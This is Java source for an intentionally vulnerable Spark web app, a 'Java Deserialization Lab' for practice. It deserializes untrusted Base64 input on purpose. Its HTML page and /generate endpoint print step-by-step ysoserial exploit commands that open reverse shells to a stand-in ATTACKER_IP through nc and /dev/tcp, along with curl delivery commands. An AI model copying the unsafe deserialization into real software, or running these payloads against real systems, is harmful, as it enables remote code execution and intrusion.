package com.drakonix;

import spark.*;
import java.io.*;
import java.util.*;
import java.util.Base64;
import com.google.gson.*;

import static spark.Spark.*;

public class VulnerableApp {
    private static final Gson gson = new Gson();

    public static void main(String[] args) {
        port(8081);

        get("/", (req, res) -> generateHTML());

        post("/deserialize", (req, res) -> {
            String data = req.body();
            Map<String, String> json = gson.fromJson(data, Map.class);
            String serialized = json.get("data");

            if (serialized == null || serialized.isEmpty()) {
                res.status(400);
                return gson.toJson(Map.of("error", "Missing 'data' field"));
            }

            try {
                byte[] decoded = Base64.getDecoder().decode(serialized);
                Object obj = deserializeObject(decoded);
                return gson.toJson(Map.of(
                    "status", "success",
                    "type", obj.getClass().getName(),
                    "toString", obj.toString()
                ));
            } catch (Exception e) {
                res.status(500);
                return gson.toJson(Map.of("error", e.getMessage()));
            }
        });

        post("/deserialize/form", "application/x-www-form-urlencoded", (req, res) -> {
            String serialized = req.queryParams("data");

            if (serialized == null || serialized.isEmpty()) {
                res.status(400);
                return "<html><body><h2>Error: Missing data parameter</h2><a href='/'>Back</a></body></html>";
            }

            try {
                byte[] decoded = Base64.getDecoder().decode(serialized);
                Object obj = deserializeObject(decoded);
                return "<html><body>" +
                    "<h2>Deserialization Successful!</h2>" +
                    "<p>Type: " + obj.getClass().getName() + "</p>" +
                    "<a href='/'>Back</a></body></html>";
            } catch (Exception e) {
                return "<html><body><h2>Error:</h2><pre>" + e.getMessage() + "</pre><a href='/'>Back</a></body></html>";
            }
        });

        get("/test", (req, res) -> {
            Map<String, Object> testData = new HashMap<>();
            testData.put("message", "test");
            testData.put("value", 42);

            byte[] serialized = serializeObject(testData);
            String b64 = Base64.getEncoder().encodeToString(serialized);

            res.type("application/json");
            return gson.toJson(Map.of(
                "test_data", testData,
                "base64", b64,
                "usage", "POST to /deserialize with: {\"data\": \"" + b64 + "\"}"
            ));
        });

        get("/generate", (req, res) -> {
            String ip = req.queryParams("ip");
            String port = req.queryParams("port");

            if (ip == null) ip = "ATTACKER_IP";
            if (port == null) port = "4444";

            String info = "# Java Deserialization Payload Generator\n\n";
            info += "## Using ysoserial (recommended):\n";
            info += "```bash\n";
            info += "java -jar ysoserial.jar CommonsCollections5 'nc " + ip + " " + port + " -e /bin/bash' > payload.bin\n";
            info += "base64 payload.bin > payload.b64\n";
            info += "curl -X POST http://target:8081/deserialize -d '{\"data\": \"$(cat payload.b64)\"}'\n";
            info += "```\n";

            res.type("text/plain");
            return info;
        });

        System.out.println("Server started on http://0.0.0.0:8081");
    }

    private static Object deserializeObject(byte[] data) throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            return ois.readObject();
        }
    }

    private static byte[] serializeObject(Object obj) throws Exception {
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(obj);
            return bos.toByteArray();
        }
    }

    private static String generateHTML() {
        return "<!DOCTYPE html>\n" +
            "<html>\n" +
            "<head>\n" +
            "    <title>Java Deserialization Lab</title>\n" +
            "    <style>\n" +
            "        body { font-family: monospace; background: #1a1a1a; color: #ff6600; padding: 20px; }\n" +
            "        h1 { color: #ff0066; }\n" +
            "        h2 { color: #ffff00; }\n" +
            "        .vuln { background: #2d2d2d; padding: 15px; margin: 10px 0; border-left: 4px solid #ff0066; }\n" +
            "        textarea { width: 100%; min-height: 200px; background: #0d0d0d; color: #00ff00; border: 1px solid #00ff00; padding: 10px; font-family: monospace; }\n" +
            "        input[type=submit] { padding: 10px 20px; background: #ff0066; color: #fff; border: none; cursor: pointer; margin-top: 10px; }\n" +
            "        pre { background: #0d0d0d; padding: 15px; overflow-x: auto; border: 1px solid #444; color: #00ff00; }\n" +
            "        code { background: #333; padding: 3px 6px; }\n" +
            "        .warning { background: #ff0000; color: #fff; padding: 10px; margin: 10px 0; }\n" +
            "    </style>\n" +
            "</head>\n" +
            "<body>\n" +
            "    <h1>Java Deserialization Vulnerability Lab</h1>\n" +
            "    <div class='warning'>⚠️ DANGER: This endpoint unsafely deserializes Java objects!</div>\n" +
            "\n" +
            "    <h2>Submit Serialized Object:</h2>\n" +
            "    <div class='vuln'>\n" +
            "        <form action='/deserialize/form' method='POST'>\n" +
            "            <label>Base64 Encoded Serialized Data:</label><br>\n" +
            "            <textarea name='data' placeholder='Base64 encoded serialized Java object...'></textarea><br>\n" +
            "            <input type='submit' value='Deserialize'>\n" +
            "        </form>\n" +
            "    </div>\n" +
            "\n" +
            "    <h2>Generate Payloads:</h2>\n" +
            "    <div class='vuln'>\n" +
            "        <p><a href='/test'>Get Test Payload</a> - Get a safe test object</p>\n" +
            "        <p><a href='/generate'>Generate Attack Payload</a> - Generate ysoserial payload template</p>\n" +
            "    </div>\n" +
            "\n" +
            "    <h2>How to Exploit:</h2>\n" +
            "    <h3>1. Install ysoserial on attacker:</h3>\n" +
            "    <pre>\n" +
            "git clone https://github.com/frohoff/ysoserial.git\n" +
            "cd ysoserial\n" +
            "mvn package -DskipTests\n" +
            "java -jar target/ysoserial.jar\n" +
            "    </pre>\n" +
            "\n" +
            "    <h3>2. Generate payload:</h3>\n" +
            "    <pre>\n" +
            "java -jar ysoserial.jar CommonsCollections5 'bash -c \\\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\\"' > payload.bin\n" +
            "base64 -w0 payload.bin > payload.b64\n" +
            "    </pre>\n" +
            "\n" +
            "    <h3>3. Send payload:</h3>\n" +
            "    <pre>\n" +
            "curl -X POST http://target:8081/deserialize \\\n" +
            "  -H 'Content-Type: application/json' \\\n" +
            "  -d '{\"data\": \"$(cat payload.b64)\"}'\n" +
            "    </pre>\n" +
            "\n" +
            "    <h2>Available ysoserial Gadget Chains:</h2>\n" +
            "    <ul>\n" +
            "        <li><code>CommonsCollections5</code> - Works with Java 8+</li>\n" +
            "        <li><code>CommonsCollections6</code> - Alternative for CC5</li>\n" +
            "        <li><code>CommonsCollections7</code> - Another variant</li>\n" +
            "        <li><code>C3P0</code> - For C3P0 connection pool</li>\n" +
            "    </ul>\n" +
            "</body>\n" +
            "</html>";
    }
}
